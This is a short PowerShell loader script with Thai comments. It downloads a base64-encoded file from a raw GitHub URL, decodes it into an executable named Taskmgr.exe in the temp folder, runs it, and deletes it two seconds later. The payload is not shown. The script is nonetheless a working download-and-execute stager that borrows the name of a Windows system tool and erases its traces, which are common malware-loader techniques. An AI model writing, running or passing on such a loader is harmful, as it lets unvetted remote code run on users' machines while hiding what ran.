# load.ps1
$url = "https://raw.githubusercontent.com/puddyeieiei/dydestiny/main/taskmgr.b64"

Write-Host "[*] Downloading Taskmgr.exe from GitHub..." -ForegroundColor Cyan

try {
    $base64 = (iwr -UseBasicParsing $url).Content
    $bytes = [Convert]::FromBase64String($base64)
    
    # เขียนไฟล์ชั่วคราว
    $exePath = "$env:TEMP\Taskmgr.exe"
    [IO.File]::WriteAllBytes($exePath, $bytes)
    
    Write-Host "[*] Running Taskmgr.exe..." -ForegroundColor Cyan
    
    # รันโปรแกรมของคุณ
    Start-Process -FilePath $exePath -WindowStyle Normal
    
    # รอ 2 วินาทีแล้วลบไฟล์ (Optional)
    Start-Sleep -Seconds 2
    if (Test-Path $exePath) {
        Remove-Item $exePath -Force -ErrorAction SilentlyContinue
    }
    
    Write-Host "[+] Taskmgr.exe executed successfully!" -ForegroundColor Green
}
catch {
    Write-Host "[-] Failed: $_" -ForegroundColor Red
}
